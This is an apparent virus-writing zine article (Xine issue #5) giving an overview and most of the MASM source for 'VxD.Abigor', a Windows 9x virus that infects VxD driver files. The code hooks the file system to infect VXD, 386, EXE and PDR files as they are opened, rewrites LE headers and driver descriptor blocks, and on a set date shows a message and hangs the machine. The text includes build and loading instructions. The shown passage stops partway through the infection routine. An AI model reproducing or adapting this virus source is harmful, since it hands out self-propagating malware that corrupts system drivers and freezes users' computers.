   ;
   ;
   ;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                              ³ Xine - issue #5 - Phile 212 ³
   ;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;
   ;
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ VxD.Abigor ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   This virus is a simple VxD infector. I wrote it to demonstrate VxD protec-
   ; ted-mode infection.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1. Virus analysis ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   When the virus receives execution control, it makes its residency check,
   ; goes resident (if necessary) and installs the required VxD hooks. Then, it
   ; activates the payload if the current date matches the one of the payload and
   ; returns execution to the host's DDB control procedure. The virus entrypoint
   ; consists of a call (patched with a relocation) to the virus object, placed
   ; in the DDB reserved fields.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.1. Residency ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   To go resident, the virus calls _HeapAllocate.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.2. VxD hooks ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   The "Test_Debug_Installed" hook handles the residency check whereas the
   ; file hook handles the infection of VxD files.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.3. Payload ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   The virus decrypts and displays the following string:
   ;
   ; "VxD.Abigor, Horned Beast/VADER"
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.4. File map: VxD ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;     Before infection           After infection
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³                      ³   ³                      ³
   ; ³       VxD data       ³   ³       VxD data       ³
   ; ³                      ³   ³      (modified)      ³
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³   Enum data pages    ³   ³   Enum data pages    ³
   ; ³                      ³   ³                      ³
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³  Non-resident data   ³   ³  Non-resident data   ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³     Virus object     ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; Or:
   ;
   ;     Before infection           After infection
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³                      ³   ³                      ³
   ; ³       VxD data       ³   ³       VxD data       ³
   ; ³                      ³   ³      (modified)      ³
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³   Enum data pages    ³   ³   Enum data pages    ³
   ; ³                      ³   ³                      ³
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³  Non-resident data   ³   ³     Virus object     ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³  Non-resident data   ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 2. Assembling and compiling ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; Compile it to a VXD file, using:
   ; nmake /A
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 3. Loading ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Register the virus VxD in the SYSTEM.INI file and restart Windows. The vi-
   ; rus will then stay resident and infect any accessed files.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 4. Disinfection ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Disinfection is very complex due to the exhaustive LE header manipulation.
   ; The remaining alternative method is to make the virus inactive. One way of
   ; doing this is to force the conditional jump from the residency check.
   ;
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ Start of file: ABIGOR.ASM ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                   .386p

   MASM            =       1 ;Needed for IFS.INC

                   .XList
                   include VMM.INC
                   include IFS.INC
                   include IFSMGR.INC
                   include SHELL.INC
                   include MZ.INC
                   include LE.INC
                   .List

                   public  ABIGOR_DDB

   Virus_Physical_Size =   Virus_Physical_End-Virus_Start
   Virus_Virtual_Size =    Virus_Virtual_End-Virus_Start
   Virus_Sign      =       'Horn'
   HB_Sign         =       'HB' ;"Horned Beast"
   Min_Page_Size   =       100h
   Max_Page_Size   =       8000h
   Payload_Day     =       4
   Payload_Month   =       7

   VxD_CODE_SEG

   Return_Control:
                   clc
                   ret

   ABIGOR_DDB      VxD_Desc_Block <,,,,,,"ABIGOR",,Abigor_Control>

   ;Simulate host execution
                   org     $.(DDB_Reserved3-1)-(size VxD_Desc_Block)
   Abigor_Control:
                   call    Virus_Start

                   Dword_Align

   Virus_Start:
                   pushad
                   mov     ebp,dword ptr [esp+(size Pushad_Struc)] ;Return address
                   mov     ebx,Abigor_Control-Return_Control
   Host_Relocation =       $-4
                   add     ebx,(size VxD_Desc_Block)-(DDB_Reserved3-1)
                   sub     dword ptr [esp+(size Pushad_Struc)],ebx ;Fix return address
                   cmp     eax,INIT_COMPLETE
                   je      Message_OK
                   cmp     eax,SYS_DYNAMIC_DEVICE_INIT
                   jne     Return_to_Host
   Message_OK:
                   ;Fix jump to DDB control procedure
                   inc     byte ptr [ebp.(DDB_Reserved3-1)-(size VxD_Desc_Block)] ;Call->jmp
                   neg     ebx
                   mov     dword ptr [ebp.DDB_Reserved3-(size VxD_Desc_Block)],ebx
                   call    Start_Delta
   Start_Delta:
                   pop     esi
                   call    Fix_Dynamic_Links
                   mov     eax,Virus_Sign
   Dynamic_Link1:
                   VMMCall Test_Debug_Installed ;Residency check
                   or      eax,eax
                   jz      Return_to_Host ;Already resident
                   mov     eax,Virus_Virtual_Size
                   call    My_HeapAllocate
                   jz      Return_to_Host ;No memory
                   xchg    eax,edi
                   lea     esi,[esi+(Virus_Start-Start_Delta)]
                   mov     ecx,(Virus_Physical_Size+3)/4
                   push    edi
                   cld
                   rep     movsd ;Copy virus
                   pop     edi
                   ;Install hooks
                   lea     esi,[edi+(Debug_Hook-Virus_Start)]
                   lea     ebx,[esi+(Old_Debug-Debug_Hook)]
                   mov     dword ptr [ebx],ecx
                   mov     dword ptr [esi-(Debug_Hook-Old_Debug_Pointer)],ebx
                   GetVxDServiceOrdinal eax,Test_Debug_Installed
   Dynamic_Link2:
                   VMMCall Hook_Device_Service
                   mov     byte ptr [edi+(Disable_Hook-Virus_Start)],0
                   lea     eax,[edi+(File_Hook-Virus_Start)]
                   push    eax
   Dynamic_Link5:
                   VxDCall IFSMgr_InstallFileSystemApiHook
                   pop     ecx
                   mov     dword ptr [edi+(Old_File-Virus_Start)],eax
                   ;The payload
                   mov     al,7
                   out     70h,al
                   in      al,71h
                   cmp     al,Payload_Day
                   jne     Return_to_Host
                   mov     al,8
                   out     70h,al
                   in      al,71h
                   cmp     al,Payload_Month
                   jne     Return_to_Host
                   lea     ecx,[edi+(Virus_Name-Virus_Start)]
                   mov     edi,ecx
                   dec     edi
   Decrypt_Name:
                   inc     edi
                   xor     byte ptr [edi],66h
                   jnz     Decrypt_Name
                   VMMCall Get_Sys_VM_Handle
                   xor     eax,eax ;Message box flags
                   VxDCall SHELL_SYSMODAL_Message ;Display virus name
                   jmp     $ ;Hang execution
   Return_to_Host:
                   popad
                   ret

   ;Simulate a HOOK_PROC
                   jmp     Debug_Hook
                   jmp     dword ptr [Old_Debug]
   Old_Debug_Pointer =     $-4
   Debug_Hook:
                   pushfd
                   cmp     eax,Virus_Sign
                   jne     Debug_Exit
                   xor     eax,eax
   Debug_Exit:
                   popfd
                   push    12345678h
   Old_Debug       =       $-4
                   ret

   Virus_Name      db      48,30,34,72,39,4,15,1,9,20,74,70,46,9,20,8,3,2,70,36
                   db      3,7,21,18,73,48,39,34,35,52,102
   ;Encrypted "VxD.Abigor, Horned Beast/VADER",0

   BeginProc       File_Hook,CCALL,HIGH_FREQ

                   ArgVar  FSDFnAddr,DWORD
                   ArgVar  FunctionNum,DWORD
                   ArgVar  Drive,DWORD
                   ArgVar  ResourceFlags,DWORD
                   ArgVar  CodePage,DWORD
                   ArgVar  pir,DWORD

                   LocalVar LE_Info_Mem,DWORD
                   LocalVar DDB_Offset_Obj,DWORD
                   LocalVar LE_Header_File,DWORD
                   LocalVar LE_Info_File,DWORD
                   LocalVar LE_Info_Size,DWORD
                   LocalVar DDB_Offset_File,DWORD
                   LocalVar File_Handle,DWORD

                   EnterProc
                   pushad
                   mov     al,12h
   Disable_Hook    =       $-1
                   cmp     al,0
                   jne     File_Hook_Exit
                   cmp     dword ptr [FunctionNum],IFSFN_OPEN ;Function
                   jne     File_Hook_Exit
                   call    File_Delta
   File_Delta:
                   pop     edi
                   inc     byte ptr [edi+(Disable_Hook-File_Delta)]
                   lea     ebx,[edi+(File_Buffer-File_Delta)]
                   mov     eax,dword ptr [Drive] ;Drive number
                   cmp     al,-1
                   je      No_Drive ;UNC resource
                   add     al,'A'-1
                   mov     ah,':'
                   mov     dword ptr [ebx],eax
                   inc     ebx
                   inc     ebx
   No_Drive:
                   mov     eax,dword ptr [pir] ;Pointer to IOREQ
                   mov     eax,dword ptr [eax.ir_ppath]
                   add     eax,ParsedPath.pp_elements
                   push    BCS_WANSI
                   push    Virus_Virtual_End-Virus_Physical_End
                   push    eax
                   push    ebx
   Dynamic_Link6:
                   VxDCall UniToBCSPath
                   add     esp,4*4
                   add     ebx,eax
                   mov     eax,dword ptr [ebx-3] ;File extension
                   cmp     eax,'DXV'
                   je      Extension_OK
                   cmp     eax,'683'
                   je      Extension_OK
                   cmp     eax,'EXE'
                   je      Extension_OK
                   cmp     eax,'RDP'
                   jne     Infection_Done
   Extension_OK:
                   lea     esi,[edi+(File_Buffer-File_Delta)]
                   mov     eax,R0_OPENCREATFILE
                   mov     bx,2 ;Read/write
                   mov     dx,1 ;Open file if it exists
                   call    Original_FileIO ;Open the file (read/write mode)
                   jc      Infection_Done
                   mov     dword ptr [File_Handle],eax
                   call    Infect_File
                   mov     eax,R0_CLOSEFILE
                   call    Simulate_FileIO ;Close the file
   Infection_Done:
                   dec     byte ptr [edi+(Disable_Hook-File_Delta)]
   File_Hook_Exit:
                   popad
                   LeaveProc
                   push    dword ptr ds:[12345678h]
   Old_File        =       $-4
                   Return

   EndProc         File_Hook,KEEPFRAMEVARS

   ;Routines

   ;Infect file
   ;þ On entry:
   ;  EDI=File_Delta
   ;  File_Handle=Handle of file to infect
   ;þ On exit:
   ;  EAX,EBX,ECX,EDX,ESI=?
   ;  Update all data
   Infect_File:
                   ;Init data
                   xor     eax,eax
                   mov     dword ptr [LE_Info_Mem],eax
                   call    Read_LE
                   jc      Dealloc_Exit
                   xor     ecx,ecx
                   mov     cl,5
                   mov     edx,dword ptr [esi.LE_nrestab]
                   sub     edx,ecx
                   push    esi
                   lea     esi,[edi+(DDB_Buffer-File_Delta)]
                   call    FileIO_Read
                   cmp     word ptr [esi],1234h
                   org     $-2
                   int     Dyna_Link_Int
                   pop     esi
                   je      Dealloc_Exit ;Erroneous driver
                   call    Update_DDB
                   jc      Dealloc_Exit
                   call    Clear_Checksums
                   call    Update_LE
                   jc      Dealloc_Exit
                   mov     ecx,dword ptr [edi+(Virus_Object.OH_pagemap-File_Delta)]
                   dec     ecx
                   call    Get_Page_Offset
                   jc      Dealloc_Exit
                   xchg    eax,edx
                   mov     eax,R0_GETFILESIZE
                   call    Simulate_FileIO
                   cmp     eax,edx
                   jbe     Write_Virus_Body ;Non-resident data fits in last segment
                   mov     ecx,dword ptr [esi.LE_nrestab]
                   sub     eax,ecx
                   mov     esi,edx
                   push    ecx
                   push    eax
                   call    My_HeapAllocate
                   pop     ecx
                   pop     edx
                   jz      Dealloc_Exit
                   push    esi
                   xchg    eax,esi
                   call    FileIO_Read ;Read non-resident data
                   pop     eax
                   push    eax
                   add     eax,Virus_Physical_Size
                   xchg    eax,edx
                   sub     eax,edx
                   neg     eax ;-(eax-edx)=(edx-eax)
                   push    eax
                   call    FileIO_Write ;Write non-resident data
                   xchg    eax,esi
                   call    My_HeapFree
                   pop     ebx ;Pointer displacement
                   xor     eax,eax
                   inc     eax
                   lea     edx,[edi+(File_Buffer.LE_nrestab-File_Delta)]
                   call    Adjust_Pointer
                   lea     edx,[edi+(File_Buffer.LE_debuginfo-File_Delta)]
                   call    Adjust_Pointer
                   lea     edx,[edi+(File_Buffer.LE_winresoff-File_Delta)]
                   call    Adjust_Pointer
                   pop     edx
   Write_Virus_Body:
                   mov     ecx,Virus_Physical_Size
                   lea     esi,[edi+(Virus_Start-File_Delta)]
                   call    FileIO_Write ;Write virus body
                   mov     ecx,size VxD_Desc_Block
                   mov     edx,dword ptr [DDB_Offset_File]
                   lea     esi,[edi+(DDB_Buffer-File_Delta)]
                   call    FileIO_Write ;Write DDB
                   mov     ecx,IMAGE_SIZEOF_VXD_HEADER
                   mov     edx,dword ptr [LE_Header_File]
                   lea     esi,[edi+(File_Buffer-File_Delta)]
                   call    FileIO_Write ;Write LE header
                   mov     ecx,dword ptr [LE_Info_Size]
                   mov     edx,dword ptr [LE_Info_File]
                   mov     esi,dword ptr [LE_Info_Mem]
                   call    FileIO_Write ;Write LE info
   Dealloc_Exit:
                   mov     ecx,dword ptr [LE_Info_Mem]
                   jecxz   No_Dealloc
                   xchg    eax,ecx
                   call    My_HeapFree
   No_Dealloc:
                   ret

   ;Read LE header and info, mark file infected/impossible to infect
   ;þ On entry:
   ;  EDI=File_Delta
   ;  File_Handle=Handle of file to read/write
   ;þ On exit:
   ;  ESI=File_Buffer
   ;  * Carry flag clear:
   ;    File_Buffer filled with LE header
   ;    LE_Header_File=Offset (within file) of LE header
   ;    LE_Info_Mem=Pointer to LE info (allocated memory)
   ;    LE_Info_File=Offset (within file) of LE info
   ;    LE_Info_Size=Size of LE info
   ;  * Carry flag set: ERROR
   Read_LE:
                   lea     esi,[edi+(File_Buffer-File_Delta)]
                   pushad
                   mov     ecx,IMAGE_SIZEOF_DOS_HEADER
                   xor     edx,edx
                   call    FileIO_Read ;Read MZ header
                   cmp     word ptr [esi.MZ_magic],IMAGE_DOS_SIGNATURE
                   jne     Read_LE_Fail
                   cmp     word ptr [esi.MZ_lfarlc],IMAGE_SIZEOF_DOS_HEADER
                   jb      Read_LE_Fail
                   mov     ax,HB_Sign
                   cmp     word ptr [esi.MZ_csum],ax
                   je      Read_LE_Fail ;File already infected/impossible to infect
                   mov     dword ptr [esi],eax
                   mov     cl,2
                   mov     dl,MZ_csum
                   call    FileIO_Write ;Mark file infected/impossible to infect
                   jc      Read_LE_Fail
                   mov     edx,dword ptr [esi.MZ_lfanew]
                   mov     dword ptr [LE_Header_File],edx
                   mov     cl,IMAGE_SIZEOF_VXD_HEADER
                   call    FileIO_Read ;Read LE header
                   add     edx,ecx
                   mov     dword ptr [LE_Info_File],edx
                   call    Check_Valid_LE
                   jnz     Read_LE_Fail
                   mov     eax,dword ptr [esi.LE_datapage]
                   sub     eax,edx
                   push    eax
                   call    My_HeapAllocate
                   pop     ecx
                   jz      Read_LE_Fail
                   mov     dword ptr [LE_Info_Mem],eax
                   mov     dword ptr [LE_Info_Size],ecx
                   mov     edx,dword ptr [LE_Info_File]
                   xchg    eax,esi
                   call    FileIO_Read ;Read LE info
                   popad
                   ret
   Read_LE_Fail:
                   popad
                   stc
                   ret

   ;Check for a valid LE header
   ;þ On entry:
   ;  ESI=Pointer to LE header
   ;þ On exit:
   ;  EAX=?
   ;  ECX=0
   ;  * Zero flag set: Valid LE
   ;  * Zero flag clear: Invalid LE
   Check_Valid_LE:
                   xor     ecx,ecx
                   cmp     dword ptr [esi.LE_magic],(IMAGE_VXD_LEWO shl 24)\
                   +(IMAGE_VXD_LEBO shl 16)+IMAGE_VXD_SIGNATURE
                   jne     Exit_LE_Check
                   cmp     dword ptr [esi.LE_level],ecx
                   jne     Exit_LE_Check
                   mov     eax,dword ptr [esi.LE_cpu]
                   cmp     eax,(IMAGE_VXD_OS_DEV386 shl 16)+IMAGE_VXD_CPU_386
                   jb      Exit_LE_Check
                   cmp     eax,(IMAGE_VXD_OS_DEV386 shl 16)+IMAGE_VXD_CPU_586
                   ja      Exit_LE_Check
                   test    dword ptr [esi.LE_mflags],not (IMAGE_VXD_MODMASK+IMAGE_VXD_NOEXTFIX)
                   jnz     Exit_LE_Check
                   mov     eax,dword ptr [esi.LE_pagesize]
                   cmp     eax,Min_Page_Size
                   jb      Exit_LE_Check
                   cmp     eax,Max_Page_Size
                   ja      Exit_LE_Check
                   cmp     dword ptr [esi.LE_itermap],ecx
                   jne     Exit_LE_Check
                   cmp     dword ptr [esi.LE_rsrccnt],ecx
                   jne     Exit_LE_Check
                   cmp     dword ptr [esi.LE_dircnt],ecx
                   jne     Exit_LE_Check
                   cmp     dword ptr [esi.LE_impmodcnt],ecx
                   ;jne Exit_LE_Check
   Exit_LE_Check:
                   ret

   ;Read and update DDB related data
   ;þ On entry:
   ;  ESI=Pointer to LE header
   ;  EDI=File_Delta
   ;  File_Handle=Handle of file to read
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;þ On exit:
   ;  * Carry flag clear:
   ;    DDB_Offset_Obj=Offset of the DDB_Reserved3-1 field (in first object)
   ;    DDB_Offset_File=Offset (within file) of DDB
   ;    DDB_Buffer filled with updated DDB
   ;    LE info updated (if necessary)
   ;    Host_Relocation updated
   ;  * Carry flag set: ERROR
   Update_DDB:
                   pushad
                   call    Get_Object_Table
                   cmp     dword ptr [eax.OH_flags],IMAGE_OBJ_READ+IMAGE_OBJ_EXEC\
                   +IMAGE_OBJ_PRELOAD+IMAGE_OBJ_BIGDEF
                   jne     Update_DDB_Fail
                   mov     eax,dword ptr [esi.LE_enttab]
                   call    Recalc
                   cmp     dword ptr [eax.EB_type],((IMAGE_ENT_EXPORT+IMAGE_ENT_SHARED) shl 24)\
                   +(1 shl 8)+IMAGE_BND_ENTRY32
                   jne     Update_DDB_Fail
                   mov     eax,dword ptr [eax+IMAGE_SIZEOF_ENTRY_BUNDLE.EH_offset]
                   lea     edx,[eax.(DDB_Reserved3-1)]
                   mov     dword ptr [DDB_Offset_Obj],edx
                   push    eax
                   call    Calculate_Page
                   push    edx
                   call    Get_Page_Offset
                   pop     edx
                   jc      Bad_DDB_Page
                   add     edx,eax
                   mov     dword ptr [DDB_Offset_File],edx
                   mov     ecx,size VxD_Desc_Block
                   push    esi
                   lea     esi,[edi+(DDB_Buffer-File_Delta)]
                   call    FileIO_Read ;Read DDB
                   pop     esi
   Bad_DDB_Page:
                   pop     eax
                   jc      Update_DDB_Fail
                   add     eax,DDB_Control_Proc
                   call    Calculate_Page
                   mov     eax,dword ptr [esi.LE_fpagetab]
                   call    Recalc
                   mov     ebx,dword ptr [eax+ecx*IMAGE_SIZEOF_FIXUP_PAGE_HEADER]
                   mov     ecx,dword ptr [eax+ecx*IMAGE_SIZEOF_FIXUP_PAGE_HEADER\
                   +IMAGE_SIZEOF_FIXUP_PAGE_HEADER]
                   mov     eax,dword ptr [esi.LE_frectab]
                   call    Recalc
                   add     ebx,eax
                   add     ecx,eax
                   call    Find_Reloc
                   jnc     Modify_Reloc ;Relocation found
                   cmp     ebx,ecx
                   jb      Update_DDB_Fail ;Unknown relocation type
                   mov     eax,dword ptr [DDB_Offset_Obj]
                   mov     ecx,eax
                   xchg    eax,dword ptr [edi+(DDB_Buffer.DDB_Control_Proc-File_Delta)]
                   jmp     Store_Displacement
   Modify_Reloc:
                   mov     ecx,dword ptr [DDB_Offset_Obj]
                   or      ah,ah
                   jnz     Modify_Reloc32
                   movzx   eax,cx
                   cmp     eax,ecx
                   jne     Update_DDB_Fail ;Offset doesn't fit in relocation
                   xchg    ax,word ptr [edx]
                   jmp     Store_Displacement
   Modify_Reloc32:
                   mov     eax,ecx
                   xchg    eax,dword ptr [edx]
   Store_Displacement:
                   sub     ecx,eax
                   mov     dword ptr [edi+(Host_Relocation-File_Delta)],ecx
                   ;Store:
                   ;call $+5 (at (DDB_Reserved3-1))
                   ;This call will be patched with a relocation
                   mov     byte ptr [edi+(DDB_Buffer.(DDB_Reserved3-1)-File_Delta)],0e8h
                   xor     ecx,ecx
                   mov     dword ptr [edi+(DDB_Buffer.DDB_Reserved3-File_Delta)],ecx
                   popad
                   clc
                   ret
   Update_DDB_Fail:
                   popad
                   stc
                   ret

   ;Calculate page relative offset
   ;þ On entry:
   ;  EAX=Offset (within first object)
   ;  ESI=Pointer to LE header
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;þ On exit:
   ;  EAX=?
   ;  ECX=Page number
   ;  EDX=Offset (within page)
   Calculate_Page:
                   cdq
                   mov     ecx,dword ptr [esi.LE_pagesize]
                   div     ecx
                   xchg    eax,ecx
                   call    Get_Object_Table
                   add     ecx,dword ptr [eax.OH_pagemap]
                   dec     ecx
                   ret

   ;Find a relocation (within a page)
   ;þ On entry:
   ;  EBX=Start of "Fixup Record" data for the page
   ;  ECX=End of "Fixup Record" data for the page
   ;  DX=Offset to seek (within the page)
   ;þ On exit:
   ;  EAX,EBX=?
   ;  * Carry flag clear:
   ;    EDX=Pointer to relocation
   ;    AH=0: 16-bit relocation
   ;    AH>0: 32-bit relocation
   ;  * Carry flag set:
   ;    EBXòECX: Relocation not found
   ;    EBX<ECX: ERROR
   Find_Reloc:
                   push    ebp
   Find_Reloc_Next:
                   cmp     ebx,ecx
                   jae     Find_Reloc_Fail
                   mov     eax,dword ptr [ebx.FR_stype]
                   test    ah,not IMAGE_RLC_32BITOFF
                   jnz     Find_Reloc_Fail ;Invalid relocation type
                   test    al,IMAGE_RLC_ST_CHAIN
                   jnz     Reloc_List
                   cmp     al,IMAGE_RLC_ST_SOFF32
                   je      Skip_Reloc
                   cmp     al,IMAGE_RLC_ST_OFF32
                   jne     Find_Reloc_Fail
                   cmp     byte ptr [ebx.FR_fixup.FH_obj],1
                   jne     Skip_Reloc ;Wrong object
                   cmp     word ptr [ebx.FR_fixup.FH_soff],dx
                   jne     Skip_Reloc ;Wrong source offset
                   lea     edx,[ebx.FR_fixup.FH_offset]
                   jmp     Find_Reloc_OK
   Skip_Reloc:
                   add     ebx,IMAGE_RLC_INTSIZE16
                   jmp     Go_Next_Reloc
   Reloc_List:
                   cmp     al,IMAGE_RLC_ST_SOFF32+IMAGE_RLC_ST_CHAIN
                   je      Skip_Reloc_List
                   cmp     al,IMAGE_RLC_ST_OFF32+IMAGE_RLC_ST_CHAIN
                   jne     Find_Reloc_Fail
                   cmp     byte ptr [ebx.FR_chain.FC_obj],1
                   jne     Skip_Reloc_List ;Wrong object
                   movzx   ebp,byte ptr [ebx.FR_chain.FC_srccount]
   Next_List_Reloc:
                   dec     ebp
                   js      Skip_Reloc_List
                   or      ah,ah
                   jz      Compare_List16
                   cmp     word ptr [ebx+IMAGE_RLC_LISTSIZE32+ebp*2],dx
                   jmp     Offset_Compared
   Compare_List16:
                   cmp     word ptr [ebx+IMAGE_RLC_LISTSIZE16+ebp*2],dx
   Offset_Compared:
                   jne     Next_List_Reloc ;Wrong source offset
                   lea     edx,[ebx.FR_chain.FC_offset]
   Find_Reloc_OK:
                   pop     ebp
                   clc
                   ret
   Skip_Reloc_List:
                   movzx   ebp,byte ptr [ebx.FR_chain.FC_srccount]
                   lea     ebx,[ebx+ebp*2+IMAGE_RLC_LISTSIZE16]
   Go_Next_Reloc:
                   or      ah,ah
                   jz      Find_Reloc_Next
                   ;Add ebx,(IMAGE_RLC_INTSIZE32-IMAGE_RLC_INTSIZE16)=(IMAGE_RLC_LISTSIZE32\
                   ;-IMAGE_RLC_LISTSIZE16)
                   inc     ebx
                   inc     ebx
                   jmp     Find_Reloc_Next
   Find_Reloc_Fail:
                   pop     ebp
                   stc
                   ret

   ;Calculate the file offset for a page
   ;þ On entry:
   ;  ECX=Page number
   ;  ESI=Pointer to LE header
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;þ On exit:
   ;  EAX,ECX,EDX=?
   ;  * Carry flag clear:
   ;    EAX=Offset (within file) of page
   ;    ECX,EDX=?
   ;  * Carry flag set: ERROR
   Get_Page_Offset:
                   mov     eax,dword ptr [esi.LE_objmap]
                   call    Recalc
                   cmp     byte ptr [eax.OPH_flags\
                   +ecx*IMAGE_SIZEOF_OBJECT_PAGE_HEADER],IMAGE_PAGE_VALID
                   jne     Get_Page_Offset_Fail
                   mov     eax,dword ptr [eax.OPH_highpage+ecx*IMAGE_SIZEOF_OBJECT_PAGE_HEADER]
                   xchg    al,ah
                   rol     eax,16
                   xchg    al,ah
                   ror     eax,8
                   dec     eax
                   mov     ecx,dword ptr [esi.LE_pagesize]
                   mul     ecx
                   add     eax,dword ptr [esi.LE_datapage]
                   clc
                   ret
   Get_Page_Offset_Fail:
                   stc
                   ret

   ;Clear checksums
   ;þ On entry:
   ;  ESI=Pointer to LE header
   ;þ On exit:
   ;  EDX=0
   ;  Checksums cleared
   Clear_Checksums:
                   xor     edx,edx
                   mov     dword ptr [esi.LE_fixupsum],edx
                   mov     dword ptr [esi.LE_ldrsum],edx
                   mov     dword ptr [esi.LE_pagesum],edx
                   ret

   ;Update LE data, adding the virus object and the respective relocation
   ;þ On entry:
   ;  ESI=Pointer to LE header
   ;  EDI=File_Delta
   ;  LE_Header_File=Offset (within file) of LE header
   ;  DDB_Offset_Obj=Offset of the DDB_Reserved3-1 field (in first object)
   ;  LE_Info_Mem=Pointer to LE info (allocated memory)
   ;  LE_Info_Size=Size of LE info
   ;þ On exit:
   ;  * Carry flag clear:
   ;    LE header updated
   ;    LE info updated
   ;    Virus_Object updated
   ;  * Carry flag set: ERROR
   Update_LE:
                   pushad
                   mov     ebx,dword ptr [esi.LE_fpagetab]
                   add     ebx,dword ptr [esi.LE_fixupsize]
                   add     ebx,dword ptr [LE_Header_File]
                   mov     eax,Virus_Physical_Size
                   cdq
                   mov     ecx,dword ptr [esi.LE_pagesize]
                   div     ecx
                   or      edx,edx
                   jnz     Round_Size
                   mov     edx,ecx
                   dec     eax
   Round_Size:
                   inc     eax
                   mov     dword ptr [esi.LE_lastpagesize],edx
                   mov     dword ptr [edi+(Virus_Object.OH_mapsize-File_Delta)],eax
                   lea     ebx,[ebx+eax*(IMAGE_SIZEOF_OBJECT_PAGE_HEADER\
                   +IMAGE_SIZEOF_FIXUP_PAGE_HEADER)+IMAGE_SIZEOF_OBJECT_HEADER\
                   +IMAGE_RLC_INTSIZE16]
                   cmp     dword ptr [esi.LE_datapage],ebx
                   jb      Update_LE_Fail ;Not enough space for virus object and relocation
                   mov     eax,dword ptr [esi.LE_mpages]
                   inc     eax
                   mov     dword ptr [edi+(Virus_Object.OH_pagemap-File_Delta)],eax
                   mov     eax,dword ptr [esi.LE_objmap]
                   mov     ebx,IMAGE_SIZEOF_OBJECT_HEADER
                   call    Move_Data
                   push    esi
                   push    edi
                   lea     esi,[edi+(Virus_Object-File_Delta)]
                   xchg    eax,edi
                   mov     ecx,IMAGE_SIZEOF_OBJECT_HEADER/4
                   cld
                   rep     movsd ;Copy virus object
                   pop     edi
                   pop     esi
                   mov     eax,dword ptr [esi.LE_mpages]
